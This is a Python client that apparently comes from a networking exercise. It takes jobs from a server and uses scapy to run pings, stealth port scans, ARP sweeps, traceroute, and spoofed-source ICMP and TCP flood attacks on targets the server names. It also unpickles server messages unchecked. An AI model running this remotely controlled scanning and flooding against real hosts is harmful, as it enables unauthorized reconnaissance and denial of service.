import pickle
import random
import socket
import sys
import time
import scapy
import math
from scapy.layers.inet import ICMP, IP, TCP, fragment, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sr1, srp
from scapy.volatile import RandShort

PORT = 6000
SERVER = socket.gethostbyname(socket.gethostname())  # Get IP
ADDR = (SERVER, PORT)
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create client socket
conn.connect(ADDR)  # Connects socket to remote host
print(f"Connected to server @ {ADDR}\n")
val = "y"
connected = True

# --- Shared Messages ---

DISCONNECT = "disconnect"
JOB_REQUEST = "jobrequest"
JOB_REPORT = "jobreport"
JOB_COMPLETE = "completed"
JOB_INCOMPLETE = "incomplete"
JOB_ASSIGNMENT = "assignment"
JOB_SUCCESS = "success"
JOB_FAILURE = "failure"
COMPLETION_ACK = "goodjob"


# --- Function Definitions ---

def send(v):  # Function to send messages to the server
    # Pickle the message
    msg = pickle.dumps(v)
    conn.send(msg)

    if v[0] == DISCONNECT:
        print(f"Disconnecting from server @ {ADDR}")
        connected = False
    else:
        print(f"Waiting for server @ {ADDR}\n")
        msg = conn.recv(2048)
        v = pickle.loads(msg)
        if v[0] == JOB_ASSIGNMENT:
            print(f"Received a job assignment from server @ {ADDR}")
            if v[1] == 1:
                job1(v)
            elif v[1] == 2:
                job2(v)
            elif v[1] == 3:
                job3(v)
            elif v[1] == 4:
                job4(v)
            elif v[1] == 5:
                job5(v)
            elif v[1] == 6:
                job6(v)
            elif v[1] == 7:
                job7(v)
        elif v[0] == COMPLETION_ACK:
            print(f"Server @ {ADDR} acknowledged completion\n")


# Ping a host
def job1(v):
    print(f"\nWorking on job 1 for @ {ADDR}")
    print(v)
    host = v[2]
    print(f"\nPinging host @ {host}")
    p = sr1(IP(dst=host, ttl=20) / ICMP(), timeout=2, verbose=0)

    if p is None:
        print(f"The host @ {host} is not online.\n")
        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])
    else:
        print(f"The host @ {host} is online.\n")
        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])


# Check port status
def job2(v):
    print(f"\nWorking on job 2 for @ {ADDR}")
    host = v[2]
    port = v[3]
    sport = RandShort()

    print(f"Scanning {host}:{port} from :{sport}")
    pkt = sr1(IP(dst=host) / TCP(sport=sport, dport=port, flags="FPU"), timeout=1, verbose=0)

    if pkt is not None:
        if pkt.haslayer(TCP):
            if pkt[TCP].flags == 20:
                send([JOB_REPORT, JOB_COMPLETE, "Closed"])
            else:
                print("port, TCP flag {pkt[TCP].flag|")
        elif pkt.haslayer(ICMP):
            send([JOB_REPORT, JOB_COMPLETE, "ICMP resp / filtered"])
        else:
            send([JOB_REPORT, JOB_COMPLETE, "Unknown resp"])
    else:
        send([JOB_REPORT, JOB_COMPLETE, "Open / filtered"])


# ICMP Flood
def job3(v):
    print(f"ICMP attack commencing on {v[2]} for @ {ADDR}")
    try:
        ip_layer = IP(dst=v[2], src='192.168.2.1')
        icmp_layer = ICMP()
        pkt = ip_layer / icmp_layer
        scapy.all.send(fragment(pkt / ("X"*60000)), count=3)
        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])
    except:
        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])


# TCP flood attack
def job4(v):
    target = v[2]
    port = v[3]
    print(f"Commencing TCP flood attack on {target} for @ {ADDR}")
    try:
        ipLayer = IP(dst=target, src="192.168.50.146")
        icmpLayer = TCP(dport=port)
        packet = ipLayer / icmpLayer

        # receives no replies for sent packets, count = number of packets sent
        scapy.all.send(fragment(packet / ("X" * 60000)), count=1)

        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])
    except:
        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])


# Get live IP addresses
def job5(v):
    print(f"Working on job 5 for @ {ADDR}")
    subnet = v[2]
    print("Target Subnet: " + subnet)
    arp = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    req = ether / arp
    res = srp(req, timeout=2, verbose=0)[0]
    IPs = []
    for sent, rec in res:
        IPs.append(rec.psrc)
    if not IPs:
        print("No live IP Addresses")
        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])
    else:
        print("Live IP Addresses: " + str(IPs))
        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])


# Trace route
def job6(v):
    print(f"Working on job 6 for @ {ADDR}")
    target = v[2]
    print(f"\nTarget: {target}\n")
    p = sr1(IP(dst=target, ttl=20) / ICMP(), timeout=2, verbose=0)
    if p is None:
        print(f"Destination host unreachable.\n")
        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE, 5, target, math.inf, False])
        return

    port = 33434
    acctime = 0
    found = False
    attempts = 0

    for i in range(1, 31):
        print(f"{i:2}", end='')
        times = []
        reply = None
        ip = ""
        for j in range(3):
            pkt = IP(dst=target, ttl=i) / UDP(dport=port)
            sendtime = time.time()
            reply = sr1(pkt, verbose=0, timeout=10)

            if reply is None:
                print(f"\t    *   ", end='')
                times.append(math.inf)
            else:
                attempts = 0
                ip = reply.src
                elapsed = int(round((reply.time - sendtime) * 1000))
                times.append(elapsed)

                if elapsed >= 1:
                    print(f"\t{elapsed:5} ms", end='')
                else:
                    print(f"\t <1 ms", end='')

                if reply.type == 3:
                    found = True

        if reply is not None:
            print(f"\t{ip:15}")

            acctime += min(times)
        else:
            attempts += 1
            print(f"\tRequest timed out.")

        if attempts >= 3:
            break

        if found is True:
            break

    if found is True:
        print(f"\nTrace complete.\nRoute time is {acctime} ms")
        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS, 5, target, acctime, True])
        return
    else:
        print(f"\nRequest timed out.\n")
        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE, 5, target, math.inf, True])
        return

def job7(v):
    print(f"Working on job 7 for @ {ADDR}")
    ip = v[2][0] + "/24"
    print("Client IP address " + v[2][0])
    print("Looking for neighbours in the same LAN for Client: " + v[2][0])
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    req = ether / arp
    res = srp(req, timeout=2, verbose=0)[0]
    neighbours = []
    # Get neighbour ips and mac addresses
    for sent, rec in res:
        neighbours.append("IP: " + rec.psrc+ ", MAC: " + rec.hwsrc)
    if not neighbours:
        print("No neighbours in the same LAN ")
        send([JOB_REPORT, JOB_COMPLETE, JOB_FAILURE])
    else:
        print("Neighbours in the LAN: " + str(neighbours))
        send([JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS])


# --- Start ---
try:
    while connected:
        if random.randint(0, 25) == 0:
            send([DISCONNECT])
        else:
            print(f"Sending job request to server @ {ADDR}")
            send([JOB_REQUEST])
    sys.exit(0)
except:
    sys.exit(1)
